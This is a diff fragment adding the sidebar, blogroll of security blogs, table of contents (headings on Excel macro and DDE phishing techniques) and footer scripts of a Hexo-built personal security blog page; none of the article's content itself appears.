+                    <span class="site-state-item-count">109</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#execl钓鱼简介"><span class="nav-number">1.</span> <span class="nav-text">execl钓鱼简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、office宏攻击"><span class="nav-number">1.1.</span> <span class="nav-text">1、office宏攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDE攻击"><span class="nav-number">1.2.</span> <span class="nav-text">DDE攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#power-query-DDE-DDE的一种"><span class="nav-number">1.3.</span> <span class="nav-text">power query　DDE(DDE的一种)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实操"><span class="nav-number">2.</span> <span class="nav-text">实操</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
